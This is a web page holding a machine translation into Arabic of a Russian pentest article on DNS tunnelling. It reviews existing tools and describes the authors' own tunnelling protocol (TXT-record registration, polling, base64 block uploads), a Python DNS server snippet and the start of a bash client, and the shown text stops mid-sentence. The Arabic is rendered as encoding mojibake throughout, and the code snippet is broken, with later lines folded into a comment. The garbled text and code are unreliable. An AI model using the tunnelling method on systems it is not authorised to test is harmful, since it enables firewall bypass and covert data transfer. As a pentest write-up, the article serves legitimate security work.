<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>โ๏ธ ๐น ๐ ุญุฑูุฉ ุงููุฑูุฑ ูู ููุงูุฉ ุงูููู ุฃู DNS ูู pentest ๐ ๐๐ฝ ๐จ๐ผโ๐ผ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ูุฑุญุจุง ูู ูุดุงุฑูุน ุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู ุ ููุงุฌู ุบุงูุจูุง ุดุจูุงุช ูุฌุฒุฃุฉ ูุนุฒููุฉ ุชูุงููุง ุชูุฑูุจูุง ุนู ุงูุนุงูู ุงูุฎุงุฑุฌู. ูู ุจุนุถ ุงูุฃุญูุงู ุ ูุญู ูุฐู ุงููุดููุฉ ุ ูู ุงูุถุฑูุฑู ุฅุนุงุฏ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ุญุฑูุฉ ุงููุฑูุฑ ูู ููุงูุฉ ุงูููู ุฃู DNS ูู pentest</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p style=";text-align:right;direction:rtl">  ูุฑุญุจุง  ูู ูุดุงุฑูุน ุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู ุ ููุงุฌู ุบุงูุจูุง ุดุจูุงุช ูุฌุฒุฃุฉ ูุนุฒููุฉ ุชูุงููุง ุชูุฑูุจูุง ุนู ุงูุนุงูู ุงูุฎุงุฑุฌู.  ูู ุจุนุถ ุงูุฃุญูุงู ุ ูุญู ูุฐู ุงููุดููุฉ ุ ูู ุงูุถุฑูุฑู ุฅุนุงุฏุฉ ุชูุฌูู ุญุฑูุฉ ุงููุฑูุฑ ูู ุฎูุงู ุงูุจุฑูุชูููู ุงููุญูุฏ ุงููุชุงุญ - DNS.  ูู ูุฐู ุงูููุงูุฉ ุ ุณูู ูุฎุจุฑู ุจููููุฉ ุญู ูุดููุฉ ููุงุซูุฉ ูู ุนุงู 2018 ููุง ูู ุงููุฎุงุทุฑ ุงูุชู ุชูุงุฌููุง ูู ูุฐู ุงูุนูููุฉ.  ุณูุชู ุฃูุถูุง ูุฑุงุฌุนุฉ ุงูุฃุฏูุงุช ุงููุณุงุนุฏุฉ ุงูุดุงุฆุนุฉ ูุณูุชู ุชูุฏูู ุฅุตุฏุงุฑ ูู ุงูุฃุฏุงุฉ ุงููุณุงุนุฏุฉ ููุชูุญุฉ ุงููุตุฏุฑ ูุน ููุฒุงุช ุบุงูุจูุง ูุง ุชููู ุบูุฑ ููุฌูุฏุฉ ูู ุงูุฃุฏูุงุช ุงูููุงุซูุฉ ุงูููุฌูุฏุฉ. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli" style=";text-align:right;direction:rtl">  ูุง ูู ุฃููุงู DNS </h1><br><p style=";text-align:right;direction:rtl">  ููุงู ุจุงููุนู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูุนุฏูุฏ ูู</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงูููุงูุงุช</a> ุญูู Habrรฉ ุงูุชู ุชุดุฑุญ ูุงููุฉ ููู DNS.  ููุน ุฐูู ุ ูููู ุงูุนุซูุฑ ุนูู ุงููููู ูู ุงููุธุฑูุฉ ุญูู ููู DNS ุชุญุช ุงูููุณุฏ. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ูุง ูู ููู DNSุ</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ูุญุฏุซ ุฃู ุงููุตูู ุฅูู ุงูุดุจูุฉ ูุฏ ุชู ูุทุนู ุจุฅุญูุงู ุจูุงุณุทุฉ ุฌุฏุงุฑ ุงูุญูุงูุฉ ุ ูุชุญุชุงุฌ ุฅูู ููู ุงูุจูุงูุงุช ุจุดูู ุณูุก ููุบุงูุฉ ุ ููู ุซู ุชุฃุชู ุชูููุฉ ููู DNS ูู ุนูููุฉ ุงูุฅููุงุฐ. </p><br><p style=";text-align:right;direction:rtl">  ูู ุงููุฎุทุท ุ ูู ุดูุก ูุจุฏู ููุง ููู: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p style=";text-align:right;direction:rtl">  ูุง ุชุฒุงู ุงุณุชุนูุงูุงุช DNS ุ ุญุชู ูุน ุฅุนุฏุงุฏุงุช ุฌุฏุงุฑ ุงูุญูุงูุฉ ุงูุฃูุซุฑ ุตุฑุงูุฉ ุ ุชูุฑ ูู ุจุนุถ ุงูุฃุญูุงู ุ ูููููู ุงุณุชุฎุฏุงููุง ุนู ุทุฑูู ุงูุฅุฌุงุจุฉ ุนูููุง ูู ุฎุงุฏูู ุงูููุฌูุฏ ุนูู ุงูุฌุงูุจ ุงูุขุฎุฑ.  ุณูููู ุงูุงุชุตุงู ุจุทูุฆูุง ููุบุงูุฉ ุ ูููู ูุฐุง ูููู ูุงุฎุชุฑุงู ุงูุดุจูุฉ ุงููุญููุฉ ูููุคุณุณุฉ ุฃู ุ ุนูู ุณุจูู ุงููุซุงู ุ ูููุตูู ุจุดูู ุนุงุฌู ุฅูู ุงูุฅูุชุฑูุช ุนุจุฑ ุดุจูุฉ Wi-Fi ูุฏููุนุฉ ูู ุงูุฎุงุฑุฌ. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment" style=";text-align:right;direction:rtl">  ูุง ูู ุดุนุจู ูู ุงูููุช ุงูุฑุงูู </h1><br><p style=";text-align:right;direction:rtl">  ุงูุขู ุนูู ุงูุฅูุชุฑูุช ุ ููููู ุงูุนุซูุฑ ุนูู ุงูุนุฏูุฏ ูู ุงูุฃุฏูุงุช ุงููุณุงุนุฏุฉ ูุชุดุบูู ูุฐู ุงูุชูููุฉ - ููู ูููุง ููุฒุงุชู ูุฃุฎุทุงุกู ุงูุฎุงุตุฉ.  ุงุฎุชุฑูุง ุงูุฎูุณุฉ ุงูุฃูุซุฑ ุดุนุจูุฉ ููุงุฎุชุจุงุฑ ุงูููุงุฑู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  dnscat2 </li><li style=";text-align:right;direction:rtl">  ุงูููุฏ </li><li style=";text-align:right;direction:rtl">  dns2tcp </li><li style=";text-align:right;direction:rtl">  ููููุง </li><li style=";text-align:right;direction:rtl">  OzymanDNS </li></ul><br><p style=";text-align:right;direction:rtl">  ููููู ูุฑุงุกุฉ ุงููุฒูุฏ ุญูู ููููุฉ ุงุฎุชุจุงุฑูุง ููุง ูู ููุงูุชูุง ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">Hacker</a> .  ููุง ููุฏู ููุท ุงููุชุงุฆุฌ. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p style=";text-align:right;direction:rtl">  ููุง ุชุฑูู ูู ุงููุชุงุฆุฌ ุ ููููู ุงูุนูู ุ ูููู ูู ูุฌูุฉ ูุธุฑ ุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู ุ ููุงู ุนููุจ: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ุนููุงุก ูุชุฑุฌููู - ุนูู ุงูุฃุฌูุฒุฉ ุงููุฒูุฏุฉ ุจูุถุงุฏุงุช ููุฑูุณุงุช ุ ูู ุงูุฃุณูู ุจูุซูุฑ ุชุดุบูู ุดูุก ูุชู ุชูุณูุฑู ูู ููู ุซูุงุฆู ุ </li><li style=";text-align:right;direction:rtl">  ุนูู ุบูุฑ ูุณุชูุฑ ุชุญุช ูููุฏูุฒ ุ </li><li style=";text-align:right;direction:rtl">  ุงูุญุงุฌุฉ ุฅูู ุชุซุจูุช ุจุฑุงูุฌ ุฅุถุงููุฉ ูู ุจุนุถ ุงูุญุงูุงุช. </li></ul><br><p style=";text-align:right;direction:rtl">  ุจุณุจุจ ูุฐู ุงูุนููุจ ุ ููุง ุจุญุงุฌุฉ ุฅูู ุชุทููุฑ ุฃุฏุงุชูุง ุงูุฎุงุตุฉ ุ ูููุฐุง ุงุชุถุญ ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya" style=";text-align:right;direction:rtl">  ูู ุจุฅูุดุงุก ุฃุฏุงุฉ ููู DNS ุงูุฎุงุตุฉ ุจู </h1><br><h2 id="predystoriya" style=";text-align:right;direction:rtl">  ุงูุฎูููุฉ </h2><br><p style=";text-align:right;direction:rtl">  ุจุฏุฃ ูู ุดูุก ุฎูุงู ุงูููุจูุช ุงูุฏุงุฎูู ูุจูู ูุงุญุฏ.  ูู ุงูููุจู ูุงู ููุงู ุฌูุงุฒ ููุจููุชุฑ ุนุงู ูุณุชุฎุฏู ูุทุจุงุนุฉ ุงููุซุงุฆู ูุงูุดูุงุฏุงุช ูุงูุฃูุฑุงู ุงูุฃุฎุฑู.  ูุฏููุง: ุงูุญุตูู ุนูู ุฃูุตู ุงุณุชูุงุฏุฉ ูู ุฌูุงุฒ ูุนูู ุจูุธุงู ุงูุชุดุบูู Windows 7 ุ ููุงู Kaspersky Anti-Virus ุนูู ูุชู ุงูุทุงุฆุฑุฉ ูุณูุญ ุจุงููุตูู ุฅูู ุตูุญุงุช ูุนููุฉ ููุท (ูููู ูู ููุณ ุงูููุช ูุงู ูู ุงููููู ุญู ุฃุณูุงุก DNS). </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฅุฌุฑุงุก ุงูุชุญููู ุงูุฃููู ูุงูุญุตูู ุนูู ุจูุงูุงุช ุฅุถุงููุฉ ูู ุงูุณูุงุฑุฉ ุ ูููุง ุจุชุทููุฑ ุงูุนุฏูุฏ ูู ูุชุฌูุงุช ุงููุฌูู.  ุชูุช ุฅุฒุงูุฉ ูุณุงุฑุงุช ุชุดุบูู ุงูุฌูุงุฒ ุจุงุณุชุฎุฏุงู ุงูุจุฑุงูุฌ ุงูุซูุงุฆูุฉ ุนูู ุงูููุฑ ุ ุญูุซ ุงูุชุดู "Kaspersky" "ุงููุจูุฑ ูุงูุฑุงุฆุน" ุนูู ุงูููุฑ ูุญู ููู ูุงุจู ููุชูููุฐ.  ููุน ุฐูู ุ ุชูููุง ูู ุงูุญุตูู ุนูู ูุฑุตุฉ ูุชุดุบูู ุงูุจุฑุงูุฌ ุงููุตูุฉ ููุงุจุฉ ุนู ุงููุณุคูู ุงููุญูู ุ ูุจุนุฏูุง ูุงูุช ุฅุญุฏู ุงูุฃููุงุฑ ูู ูุฌุฑุฏ ุฅููุงููุฉ ุฅูุดุงุก ููู DNS. </p><br><p style=";text-align:right;direction:rtl">  ุจุงูุจุญุซ ุนู ุงูุฃุณุงููุจ ุงูููููุฉ ุ ูุฌุฏูุง ุนููููุง ุนูู PowerShell ูู dnscat2 (ูุชุจูุง ุนูู ุณุงุจููุง).  ูููู ูู ุงูููุงูุฉ ุ ูุงู ุงูุญุฏ ุงูุฃูุตู ุงูุฐู ุชูููุง ูู ุฅูุชุงุฌู ูู ุชุฃุณูุณ ุงุชุตุงู ููุชุฑุฉ ูุตูุฑุฉ ุ ูุจุนุฏ ุฐูู ุชุญุทู ุงูุนููู. </p><br><p style=";text-align:right;direction:rtl">  ูุฐุง ุ ุจุนุจุงุฑุฉ ููุทูุฉ ุ ุฃุฒุนุฌูุง ุจุดุฏุฉ ุ ูุฃูู ูู ูุฐู ุงูุญุงูุฉ ูุงู ูุฌูุฏ ุนููู ูุชุฑุฌู ุถุฑูุฑููุง ุจุจุณุงุทุฉ.  ูู ุงููุงูุน ุ ูุงู ูุฐุง ุฃุญุฏ ุฃุณุจุงุจ ุชุทููุฑ ุฃุฏุงุฉ ุฎุงุตุฉ ุจูุง ูููู DNS. </p><br><h2 id="trebovaniya" style=";text-align:right;direction:rtl">  ุงููุชุทูุจุงุช </h2><br><p style=";text-align:right;direction:rtl">  ูุชุทูุจุงุชูุง ุงูุฑุฆูุณูุฉ ูุฃููุณูุง ูู: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  ูุฌูุฏ ุนููุงุก ุนุงููููู (ูุฏุฑ ุงูุฅููุงู) ูุงููุชุฑุฌููู ูุฃูุธูุฉ Unix ู Windows.  ููุนููุงุก ุ ุชู ุงุฎุชูุงุฑ bash ู Powershell ุ ุนูู ุงูุชูุงูู.  ูู ุงููุณุชูุจู ุ ูุชู ุชุฎุทูุท ุนููู Perl ูู unix ุ </li><li style=";text-align:right;direction:rtl">  ุงููุฏุฑุฉ ุนูู ุฅุนุงุฏุฉ ุชูุฌูู ุญุฑูุฉ ุงููุฑูุฑ ูู ุชุทุจูู ูุนูู ุ </li><li style=";text-align:right;direction:rtl">  ุฏุนู ุนููุงุก ูุชุนุฏุฏูู ููุณุชุฎุฏู ูุงุญุฏ. </li></ul><br><h2 id="arhitektura-proekta" style=";text-align:right;direction:rtl">  ููุฏุณุฉ ุงููุดุงุฑูุน </h2><br><p style=";text-align:right;direction:rtl">  ุจูุงุกู ุนูู ุงููุชุทูุจุงุช ุ ุจุฏุฃูุง ุงูุชุทููุฑ.  ูู ุฑุฃููุง ุ ุชุชููู ุงูุฃุฏุงุฉ ูู 3 ุฃุฌุฒุงุก: ุนููู ุนูู ุงูุฌูุงุฒ ุงูุฏุงุฎูู ุ ูุฎุงุฏู DNS ุ ููููู ุตุบูุฑ ุจูู ุชุทุจูู pentester ูุฎุงุฏู DNS. </p><br><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p style=";text-align:right;direction:rtl">  ุจุงุฏุฆ ุฐู ุจุฏุก ุ ูุฑุฑูุง ุฅุนุงุฏุฉ ุชูุฌูู ุงูููู ุนุจุฑ ุณุฌูุงุช TXT. </p><br><p style=";text-align:right;direction:rtl">  ูุจุฏุฃ ุงูุนูููุฉ ุจุณูุท ููุบุงูุฉ: </p><br><ul style=";text-align:right;direction:rtl"><li style=";text-align:right;direction:rtl">  Pentester ุชุทูู ุฎุงุฏู DNS. </li><li style=";text-align:right;direction:rtl">  ูููู pentester (ุฃู ูุณุชุฎุฏู ุ ูู ุฎูุงู ุงูููุฏุณุฉ ุงูุงุฌุชูุงุนูุฉ) ุจุฅุทูุงู ุนููู ุนูู ุฌูุงุฒ ุฏุงุฎูู.  ุนูู ุงูุนููู ุ ุชูุฌุฏ ูุนููุงุช ูุซู ุงุณู ุงูุนููู ูุงููุฌุงู ุ ูููุงู ุฃูุถูุง ุฅููุงููุฉ ุชุญุฏูุฏ ุนููุงู IP ูุฎุงุฏู DNS ูุจุงุดุฑุฉู. </li><li style=";text-align:right;direction:rtl"> ูุจุฏุฃ pentester (ูู ุดุจูุฉ ุฎุงุฑุฌูุฉ) ุจุงูุจุฑููุณู ุ ุญูุซ ูุดูุฑ ุฅูู ุนููุงู IP ูุฎุงุฏู DNS ุ ููุฐูู ุงููููุฐ ุงูุฐู ูุฌุจ ุฃู ูุทุฑู ุจู ุ ุฃูุฏุงู IP (ุนูู ุณุจูู ุงููุซุงู ุ ssh ุนูู ุงูุดุจูุฉ ุงูุฏุงุฎููุฉ ุญูุซ ูุฌูุณ ุงูุนููู) ุ ูุจุงูุชุงูู ุ ุงููููุฐ ุงููุณุชูุฏู.  ูุทููุจ ูุนุฑู ุงูุนููู ุฃูุถูุง ุ ูุงูุฐู ูููู ุงูุญุตูู ุนููู ุนู ุทุฑูู ุฅุถุงูุฉ ููุชุงุญ - <code>--clients</code> . </li><li style=";text-align:right;direction:rtl">  ูููู Pentester ุจุฅุทูุงู ุชุทุจูู ุงูุงูุชูุงู ุจู ุ ูุดูุฑูุง ุฅูู ูููุฐ ุงููููู ุฅูู ุงููุถูู ุงููุญูู. </li></ul><br><h2 id="protokol-obscheniya" style=";text-align:right;direction:rtl">  ุจุฑูุชูููู ุงูุงุชุตุงูุงุช </h2><br><p style=";text-align:right;direction:rtl">  ุงููุธุฑ ูู ุจุฑูุชูููู ุจุณูุท ุฅูู ุญุฏ ูุง ููุชูุงุตู ุจูู ุงูุฎุงุฏู ูุงูุนููู. </p><br><h3 id="registraciya" style=";text-align:right;direction:rtl">  ุชุณุฌูู </h3><br><p style=";text-align:right;direction:rtl">  ุนูุฏูุง ูุจุฏุฃ ุงูุนููู ุ ูุฅูู ูุณุฌู ูุน ุงูุฎุงุฏู ุ ูุทูุจ ุณุฌู TXT ูู ุฎูุงู ูุทุงู ูุฑุนู ุจุงูุชูุณูู ุงูุชุงูู: </p><br><p style=";text-align:right;direction:rtl"> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p style=";text-align:right;direction:rtl">  0 - ููุชุงุญ ุงูุชุณุฌูู <br>  <code>&lt;7 random chars&gt;</code> - ูุชุฌูุจ ุงูุชุฎุฒูู ุงููุคูุช ูุณุฌูุงุช DNS <br>  <code>&lt;client name&gt;</code> - ุงูุงุณู ุงููุนุทู ููุนููู ุนูุฏ ุจุฏุก ุงูุชุดุบูู <br>  <code>&lt;your domain&gt;</code> - ุนูู ุณุจูู ุงููุซุงู: xakep.ru <br>  ูู ุญุงูุฉ ุงูุชุณุฌูู ุงููุงุฌุญ ุ ูุชููู ุงูุนููู ุฑุณุงูุฉ ูุฌุงุญ ูู ุงุณุชุฌุงุจุฉ TXT ุ ููุฐูู ุงููุนุฑู ุงููุฎุตุต ูู ุ ูุงูุฐู ุณูุณุชูุฑ ูู ุงุณุชุฎุฏุงูู. </p><br><h3 id="osnovnoy-cikl" style=";text-align:right;direction:rtl">  ุงูุฏูุฑุฉ ุงูุฑุฆูุณูุฉ </h3><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุงูุชุณุฌูู ุ ูุจุฏุฃ ุงูุนููู ูู ุงูุงุณุชุนูุงู ุนู ุงูุฎุงุฏู ุนู ูุฏู ุชููุฑ ุงูุจูุงูุงุช ุงูุฌุฏูุฏุฉ ุจุงูุชูุณูู </p><br><p style=";text-align:right;direction:rtl"> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p style=";text-align:right;direction:rtl">  ุฅุฐุง ูุงูุช ููุงู ุจูุงูุงุช ุฌุฏูุฏุฉ ุ ูู ุงุณุชุฌุงุจุฉ TXT ุ ูุฅููุง ุชุณุชูุจููุง ุจุงูุชูุณูู </p><br><p style=";text-align:right;direction:rtl">  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> ุ ูุฅูุง ุ <code>&lt;id&gt;ND</code> ูุฃุชู. </p><br><h3 id="cikl-zagruzki-dannyh" style=";text-align:right;direction:rtl">  ุฏูุฑุฉ ุชุญููู ุงูุจูุงูุงุช </h3><br><p style=";text-align:right;direction:rtl">  ูุชุญูู ุงูุนููู ูู ุญููุฉ ููุนุฑูุฉ ูุง ุฅุฐุง ูุงูุช ุงูุจูุงูุงุช ุชุฃุชู ูู <code>&lt;target&gt;</code> .  ุฅุฐุง ูุงู ููุงู ุฅุฌุงุจุฉ ุ ูุณูู ููุฑุฃ ุ ูู ูุง ูุตู ุ <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> ุจุญุฌู N Kb ุ <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> ุฅูู ูุชู <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> ูุฅุฑุณุงู ูุชูุฉ ุงูุจูุงูุงุช ุญุณุจ ุงููุชูุฉ ุจุงูุชูุณูู: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p style=";text-align:right;direction:rtl">  ุฅุฐุง ูุฌุญ ููู ุงููุชูุฉ ุ <code>ENDBLOCK</code> ุนูู ููุงูู ูุน ุจุนุถ ุงูุจูุงูุงุช ุญูู ุงููุชูุฉ ุงููููููุฉ ุ ููู ุญุงูุฉ ุงูุงูุชูุงุก ูู ููู ุงููุฎุฒู ุงููุคูุช ุ ูุญุตู ุนูู <code>ENDBLOCK</code> . </p><br><h2 id="dns-server" style=";text-align:right;direction:rtl">  ุฎุงุฏู DNS </h2><br><p style=";text-align:right;direction:rtl">  ุชูุช ูุชุงุจุฉ ุฎุงุฏู DNS ุงููููู ูู Python3 ุจุงุณุชุฎุฏุงู ููุชุจุฉ dnslib ุ ููุง ูุฌุนู ูู ุงูุณูู ุฅูุดุงุก ูุญูู DNS ุงูุฎุงุต ุจู ุนู ุทุฑูู ุงููุฑุงุซุฉ ูู ูุงุฆู dnslib.ProxyResolver ูุชุฌุงูุฒ ุทุฑููุฉ ุงูุนุฒู (). </p><br><p style=";text-align:right;direction:rtl">  ูุชูุญ ูู dnslib ุงูุนุธูู ุฅูุดุงุก proxyDNS ุงูุฎุงุต ุจู ุจุณุฑุนุฉ ูุจูุฑุฉ: </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ููููุง ูู ุฑูุฒ ุงูุฎุงุฏู</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><pre style=";text-align:right;direction:rtl"> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p style=";text-align:right;direction:rtl">  ูู ุงูุนุฒู () ุ ูุญุฏุฏ ุงูุงุณุชุฌุงุจุงุช ูุงุณุชุนูุงูุงุช DNS ูู ุงูุนููู: ุงูุชุณุฌูู ุ ูุทูุจ ุณุฌูุงุช ุฌุฏูุฏุฉ ุ ูุจูุงูุงุช ุฅุนุงุฏุฉ ุงููุดุฑ ุ ูุญุฐู ุงููุณุชุฎุฏู. </p><br><p style=";text-align:right;direction:rtl">  ูููู ุจุชุฎุฒูู ูุนูููุงุช ุญูู ุงููุณุชุฎุฏููู ูู ูุงุนุฏุฉ ุจูุงูุงุช SQLite ุ ูุชูุน ุญุงูุธุฉ ุงูุจูุงูุงุช ูู ุฐุงูุฑุฉ ุงููุตูู ุงูุนุดูุงุฆู ููุฏููุง ุงูุจููุฉ ุงูุชุงููุฉ ุ ุญูุซ ูููู ุงูููุชุงุญ ูู ุฑูู ุงูุนููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP โโ -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  โโ <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ููุถุน ุงูุจูุงูุงุช ูู ุงูููุจ ูู ุงููุฎุฒู ุงููุคูุช ุ ูุชุจูุง "ุงููุชููู" ุงูุตุบูุฑุฉ ุ ุงูุชู ูุชู ุฅุทูุงููุง ูู ุฏูู ูููุตู.  ููุณู ุงุชุตุงูุงุช ูู ุงูููุจ ููููู ุจุชูููุฐ ุงูุชูุฌูู: ุฅูู ุฃู ุนููู ูุฅุฑุณุงู ุงูุทูุจุงุช. </p><br><p style=";text-align:right;direction:rtl">  ูุจู ุจุฏุก ุชุดุบูู ุงูุฎุงุฏู ุ ูุญุชุงุฌ ุงููุณุชุฎุฏู ุฅูู ุชุนููู ูุนููุฉ ูุงุญุฏุฉ ููุท: DOMAIN_NAME - ุงุณู ุงููุฌุงู ุงูุฐู ุณูุนูู ุนููู ุงูุฎุงุฏู. </p><br><h2 id="klient-na-bash" style=";text-align:right;direction:rtl">  ุจุงุด ุงูุนููู </h2><br><p style=";text-align:right;direction:rtl">  ุชู ุงุฎุชูุงุฑ Bash ููุชุงุจุฉ ุนููู ูุฃูุธูุฉ Unix ุ ูุฃูู ุบุงูุจูุง ูุง ููุฌุฏ ูู ุฃูุธูุฉ Unix ุงูุญุฏูุซุฉ.  ูููุฑ Bash ุงููุฏุฑุฉ ุนูู ุงูุงุชุตุงู ูู ุฎูุงู / dev / tcp / ุ ุญุชู ูุน ุญููู ุงููุณุชุฎุฏู ุบูุฑ ุงููุญุฏูุฏุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูู ูููู ุจุชุญููู ูู ุฌุฒุก ูู ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุจุงูุชูุตูู ุ ูููู ูุธุฑุฉ ููุท ุนูู ุงูููุงุท ุงูุฃูุซุฑ ุฅุซุงุฑุฉ ููุงูุชูุงู. <br>  ูุจุฏุฃ ุงูุนููู ุจุณูุท.  ููุชูุงุตู ูุน DNS ุ ูุชู ุงุณุชุฎุฏุงู ุฃุฏุงุฉ <code>dig</code> ุงูููุงุณูุฉ.  ูุณุฌู ุงูุนููู ูุน ุงูุฎุงุฏู ุ ูุจุนุฏ ุฐูู ุ ูู ุงูุฏูุฑุฉ ุงูุฏุงุฆูุฉ ุ ูุจุฏุฃ ูู ุชูุจูุฉ ุงูุทูุจุงุช ุจุงุณุชุฎุฏุงู ุงูุจุฑูุชูููู ุงูููุถุญ ุณุงุจููุง.  ุชุญุช ุงูููุณุฏ ุฃูุซุฑ. </p><br><div class="spoiler" style=";text-align:right;direction:rtl">  <b class="spoiler_title">ุงูุฑุฃ ุงููุฒูุฏ ุนู ุนููู Bash</b> <div class="spoiler_text" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl">  ูุชู ุฅุฌุฑุงุก ูุญุต ูุชุญุฏูุฏ ูุง ุฅุฐุง ูุงู ูุฏ ุชู ุฅูุดุงุก ุงุชุตุงู ุ ูุฅุฐุง ูุงู 